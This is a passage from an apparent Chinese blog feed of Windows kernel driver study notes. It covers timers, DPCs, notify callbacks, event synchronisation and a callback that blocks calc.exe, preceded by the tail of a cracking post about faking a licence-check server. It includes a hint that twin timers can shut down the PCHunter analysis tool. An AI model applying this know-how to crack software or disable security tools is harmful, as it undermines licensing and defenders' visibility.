class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;link&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://xxxxx.xyz/xxxx.html&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;x.x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span>x<span class="punctuation">,</span><span class="attr">&quot;linktext&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxx&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>接收post传参，返回值随便（客户端得patch）</p></li></ol><hr /><p>最终效果</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/91efd3518aff1ad455201e80e1a155dc.png" alt="image-20240328174729083" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;难度：⭐&lt;/p&gt;
&lt;p&gt;- 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="crack" scheme="https://joe1sn.eu.org/tags/crack/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 8-计时器与通知</title>
    <link href="https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/"/>
    <id>https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/</id>
    <published>2024-03-27T08:00:21.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>在内核中使用定时器、通知和回调</p><p>…学到一半打靶场去了</p><h1 id="定时器"><a class="markdownIt-Anchor" href="#定时器"></a> 定时器</h1><p>CPU最短能统计时间为100纳秒 100ns</p><p>内核中使用LARGEINT来表示时间长度</p><p>1s = -10 *1000 * 1000</p><h2 id="基于设备的io定时器"><a class="markdownIt-Anchor" href="#基于设备的io定时器"></a> 基于设备的IO定时器</h2><p>在<code>DriverEntry</code>里面尝试一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TimeWorker</span><span class="params">(PVOID CONTEXT)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Irql: %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process: %s\n&quot;</span>, <span class="built_in">PsGetProcessImageFileName</span>(<span class="built_in">PsGetCurrentProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//    ...</span></span><br><span class="line">    <span class="built_in">IoInitializeTimer</span>(pDevice, TimeWorker, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">IoStartTimer</span>(pDevice);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Unload</span>()&#123;</span><br><span class="line">    <span class="built_in">IoStopTimer</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d8a887058e533a26fd3119640ff28557.png" alt="image-20240327161718432" /></p><p>主要API</p><ul><li><p><code>IoInitializeTimer</code>：创建定时</p></li><li><p><code>IoStartTimer</code>：开启定时</p></li><li><p><code>IoStopTimer</code>：关闭定时</p></li></ul><p>技巧</p><ul><li>同时启用两个定时器可以关闭PCHUNTER</li><li>做认证</li></ul><h2 id="结合dpc的定时器"><a class="markdownIt-Anchor" href="#结合dpc的定时器"></a> 结合DPC的定时器</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line">KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LARGE_INTEGER DpcTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeInitializeTimer</span>(&amp;keTimer);</span><br><span class="line">    KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">KeInitializeDpc</span>(&amp;kDPC, &amp;DpcRoutineFunc, <span class="literal">NULL</span>);</span><br><span class="line">    LARGE_INTEGER DpcTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DpcTime.QuadPart = <span class="number">-10</span> * <span class="number">1000</span> * <span class="number">2000</span>;</span><br><span class="line">    <span class="built_in">KeSetTimer</span>(&amp;keTimer, DpcTime, &amp;kDPC);</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeCancelTimer</span>(&amp;keTimer);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f9b8a75ab6eab4e335c7f7f88140713f.png" alt="image-20240327164409369" /></p><ul><li>后续可以通过<code>KeWait</code>来判断超时之类的</li><li>这个只会触发一次</li></ul><p><strong>放在工作队列线程池中运行</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ExInitializeWorkItem</span>(&amp;work_item, WorkItemRoutine, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ExQueueWorkItem</span>(&amp;work_item, CriticalWorkQueue);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8252549ad4ddd4cf75ab29a1ca6c01cb.png" alt="image-20240327170200351" /></p><ul><li>例程级别很低</li><li><code>WorkItemRoutine</code>别陷入死循环，<strong>同步</strong></li></ul><h1 id="通知"><a class="markdownIt-Anchor" href="#通知"></a> 通知</h1><p>通知：发生某一件事变更，知道事情变更，但不能操作变更的结果。<code>PsCreateNotify</code></p><p>回调：能拦截相关信息，更改流程和结果。</p><p><a href="https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/">windows内核驱动 6-链表与进程</a>讲了部分</p><p>模块加载回调：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ImageRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PUNICODE_STRING FullImageName,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessId,                <span class="comment">// pid into which image is being mapped</span></span></span></span><br><span class="line"><span class="params"><span class="function">    PIMAGE_INFO ImageInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//DbgPrint(&quot;Triigered callback\n&quot;);</span></span><br><span class="line">    PEPROCESS temppe = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    status = <span class="built_in">PsLookupProcessByProcessId</span>(ProcessId, &amp;temppe);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">ObDereferenceObject</span>(temppe);</span><br><span class="line">        PUCHAR imagename = <span class="built_in">PsGetProcessImageFileName</span>(temppe);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s] load [%wZ] with baseaddr [%llx]\n&quot;</span>, imagename, FullImageName, ImageInfo-&gt;ImageBase);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DbgPrint(&quot;FullImageName: %wZ---PID: %d\n&quot;, FullImageName, ProcessId);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PsSetLoadImageNotifyRoutine</span>(ImageRoutine);</span><br><span class="line"><span class="built_in">PsRemoveLoadImageNotifyRoutine</span>(ImageRoutine);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c39428184cbd25839e0f744924c3ea0e.png" alt="image-20240327175140251" /></p><p>其他的也很类似</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在内核中使用定时器、通知和回调&lt;/p&gt;
&lt;p&gt;…学到一半打靶场去了&lt;/p&gt;
&lt;h1 id=&quot;定时器&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#定时器&quot;&gt;&lt;/a&gt; 定时器&lt;/h1&gt;
&lt;p&gt;CPU最短能统计时间为100纳秒 100ns&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 7-进程同步</title>
    <link href="https://joe1sn.eu.org/2024/03/21/windows-kernel-driver-7-process-sync/"/>
    <id>https://joe1sn.eu.org/2024/03/21/windows-kernel-driver-7-process-sync/</id>
    <published>2024-03-21T02:00:52.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>日常复习操作系统</p><span id="more"></span><h1 id="同步方式"><a class="markdownIt-Anchor" href="#同步方式"></a> 同步方式</h1><ul><li>自旋锁，之前讲过了</li><li>信号量</li><li>互斥体</li><li><strong>事件同步</strong></li></ul><h1 id="事件同步"><a class="markdownIt-Anchor" href="#事件同步"></a> 事件同步</h1><p>基于事件的同步，理解原理比写代码更重要</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1ddff357201270d4320d39033ffede78.png" alt="image-20240321102341054" /></p><p>感觉上和R3的使用差不多</p><ul><li><p><code>KeInitializeEvent(&amp;kEvent, NotificationEvent, FALSE);</code></p><p><code>NotificationEvent</code>：通知事件，手动处理，一般只用一次</p><p><code>SynchronizationEvent</code>：同步事件，<code>KeWaitForSingleObject</code>等待通过，及不需要<code>KeResetEvent</code>，系统自动设置为未激发态</p></li><li><p>如果在R3使用Event传递<code>Handle</code>到R0，由于HANDLE不是全局，所以得<code>ObReferenceObj</code></p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">KThreadB</span><span class="params">(PVOID context)</span> </span>&#123;</span><br><span class="line">    LARGE_INTEGER sleeptime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PKEVENT pevent = (PKEVENT)context;</span><br><span class="line">    sleeptime.QuadPart = <span class="number">-100</span> * <span class="number">10</span> * <span class="number">1000</span> * <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">KeDelayExecutionThread</span>(KernelMode, FALSE, &amp;sleeptime);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Traggering envet\n&quot;</span>);</span><br><span class="line">        <span class="built_in">KeSetEvent</span>(pevent, IO_NO_INCREMENT, FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PsTerminateSystemThread</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">KThreadA</span><span class="params">(PVOID context)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(context);</span><br><span class="line">    <span class="built_in">KeInitializeEvent</span>(&amp;kEvent, NotificationEvent, FALSE);</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS status = <span class="built_in">PsCreateSystemThread</span>(&amp;hThread, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, KThreadB, (PVOID)&amp;kEvent);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create System Thread Failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hThread);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">KeWaitForSingleObject</span>(&amp;kEvent, Executive, KernelMode, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Event Just Triggered\n&quot;</span>);</span><br><span class="line">        <span class="built_in">KeResetEvent</span>(&amp;kEvent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PsTerminateSystemThread</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e36b8ba3325a6f34837cb3d2e7b5647a.png" alt="image-20240321104634499" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常复习操作系统&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 6-链表与进程</title>
    <link href="https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/"/>
    <id>https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/</id>
    <published>2024-03-20T01:24:51.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>感觉和之前学的bh文章有大量重复</p><span id="more"></span><h1 id="记录进程"><a class="markdownIt-Anchor" href="#记录进程"></a> 记录进程</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_Process</span> &#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    HANDLE pid;</span><br><span class="line">    PEPROCESS pEprocessObj;</span><br><span class="line">    <span class="type">char</span> ProcessName[<span class="number">0x10</span>];</span><br><span class="line">&#125; MyProcess, *pMyProcess;</span><br></pre></td></tr></table></figure><p>两个extern需要声明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTKERNELAPI PUCHAR <span class="title">PsGetProcessImageFileName</span><span class="params">(PEPROCESS Process)</span></span>;</span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">PsLookupProcessByProcessId</span><span class="params">(HANDLE ProcessId, PEPROCESS* Process)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ProcessNotify</span><span class="params">(HANDLE pid, HANDLE pid2, BOOLEAN value)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pid);</span><br><span class="line">    <span class="keyword">if</span> (value) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Created %d\n&quot;</span>, pid2);</span><br><span class="line">        PEPROCESS CurrentProc = <span class="literal">NULL</span>;<span class="comment">//PsGetCurrentProcess();</span></span><br><span class="line">        <span class="built_in">PsLookupProcessByProcessId</span>(pid2, &amp;CurrentProc);</span><br><span class="line">        <span class="keyword">if</span> (!CurrentProc) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PUCHAR processname = <span class="built_in">PsGetProcessImageFileName</span>(CurrentProc);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Name %s\n&quot;</span>, processname);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">....<span class="comment">//驱动加载</span></span><br><span class="line">    LIST_ENTRY listhead = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;listhead);</span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, FALSE);</span><br><span class="line">....<span class="comment">//驱动卸载</span></span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, TRUE);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a607afcc046ab446e19d6c094816f690.png" alt="image-20240320101340059" /></p><p>将获取到的链表进行链接</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ProcessNotify</span><span class="params">(HANDLE pid, HANDLE pid2, BOOLEAN value)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pid);</span><br><span class="line">    <span class="keyword">if</span> (value) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Created %d\n&quot;</span>, pid2);</span><br><span class="line">        PEPROCESS CurrentProc = <span class="literal">NULL</span>;<span class="comment">//PsGetCurrentProcess();</span></span><br><span class="line">        <span class="built_in">PsLookupProcessByProcessId</span>(pid2, &amp;CurrentProc);</span><br><span class="line">        <span class="keyword">if</span> (!CurrentProc) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pMyProcess PMyProcess = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, <span class="built_in">sizeof</span>(MyProcess),<span class="string">&#x27;cpym&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (PMyProcess) &#123;</span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>(PMyProcess, <span class="built_in">sizeof</span>(MyProcess));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// init value</span></span><br><span class="line">            PMyProcess-&gt;pid = pid2;</span><br><span class="line">            PMyProcess-&gt;pEprocessObj = CurrentProc;</span><br><span class="line">            PMyProcess-&gt;ProcessName = <span class="built_in">PsGetProcessImageFileName</span>(CurrentProc);</span><br><span class="line">            KIRQL irql = <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">KeAcquireSpinLock</span>(&amp;kSpinLock, &amp;irql);</span><br><span class="line">            <span class="built_in">InsertTailList</span>(&amp;listhead, &amp;(PMyProcess-&gt;list));</span><br><span class="line">            <span class="built_in">KeReleaseSpinLock</span>(&amp;kSpinLock, irql);</span><br><span class="line">        &#125;</span><br><span class="line">        PUCHAR processname = <span class="built_in">PsGetProcessImageFileName</span>(CurrentProc);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Name %s\n&quot;</span>, processname);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;listhead);</span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device Stopping\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (DriverObject-&gt;DeviceObject) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line"></span><br><span class="line">        UNICODE_STRING symname = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;symname, SYM_NAME);</span><br><span class="line">        <span class="built_in">IoDeleteSymbolicLink</span>(&amp;symname);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, TRUE);</span><br><span class="line"></span><br><span class="line">    PLIST_ENTRY temp = <span class="literal">NULL</span>;</span><br><span class="line">    pMyProcess tempMy = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (listhead.Blink != &amp;listhead)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = <span class="built_in">RemoveTailList</span>(&amp;listhead);</span><br><span class="line">        tempMy = <span class="built_in">CONTAINING_RECORD</span>(temp, MyProcess, list);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;link -- name: %s -- pid: %d -- obj: %p\n&quot;</span>, tempMy-&gt;ProcessName, tempMy-&gt;pid, tempMy-&gt;pEprocessObj);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/10fa90fec961ee887b47e7671a155e8a.png" alt="image-20240320104220909" /></p><h1 id="禁止程序执行"><a class="markdownIt-Anchor" href="#禁止程序执行"></a> 禁止程序执行</h1><p>关于进程的遍历这里给出第二种方式，使用<code>PsSetCreateProcessNotifyRoutineEx</code>中使用<code>PPS_CREATE_NOTIFY_INFO</code></p><p>这个API有一个很坑的地方就是必须在 <strong>链接器</strong> 中加上<code>/INTEGRITYCHECK </code></p><p>回调函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">MyBlockProcessNotify</span><span class="params">(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//UNREFERENCED_PARAMETER(Process);</span></span><br><span class="line">    <span class="comment">//DbgPrint(&quot;ProcessCreated\n&quot;);</span></span><br><span class="line">    <span class="keyword">if</span> (CreateInfo) &#123;</span><br><span class="line">        CHAR Targetp[] = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        PCHAR ProcessName = (PCHAR)<span class="built_in">PsGetProcessImageFileName</span>(Process);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;now running: %s, pid: %d\n&quot;</span>, ProcessName, ProcessId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(Targetp, ProcessName)) &#123;</span><br><span class="line">            CreateInfo-&gt;CreationStatus = STATUS_UNSUCCESSFUL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册和释放</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PsSetCreateProcessNotifyRoutineEx</span>(MyBlockProcessNotify, FALSE);</span><br><span class="line"><span class="built_in">PsSetCreateProcessNotifyRoutineEx</span>(MyBlockProcessNotify, TRUE);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bc3576b1573b2f1dcc66ea581758eb23.png" alt="image-20240320112936409" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://cloud.tencent.com/developer/article/2195942">https://cloud.tencent.com/developer/article/2195942</a></p><p><a href="https://www.bilibili.com/video/BV1QJ411A7kR">https://www.bilibili.com/video/BV1QJ411A7kR</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;感觉和之前学的bh文章有大量重复&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 5-中断级与自旋锁</title>
